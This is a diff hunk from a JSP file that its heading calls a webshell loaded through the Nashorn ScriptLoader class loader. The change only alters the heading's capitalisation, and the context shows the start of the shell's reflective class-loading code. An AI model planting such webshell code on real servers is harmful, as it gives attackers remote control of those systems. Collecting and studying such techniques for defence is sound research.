@@ -9,7 +9,7 @@
 <%@ page import="sun.reflect.misc.MethodUtil" %>
 <html>
 <body>
-<h2>jdk.nashorn.internal.runtime.ScriptLoader类加载器加载的JSP Webshell</h2>
+<h2>jdk.nashorn.internal.runtime.ScriptLoader类加载器加载的JSP WebShell</h2>
 <%
     Class c = Class.forName("jdk.nashorn.internal.runtime.ScriptLoader");
     final Constructor constructor = c.getDeclaredConstructor(Context.class);
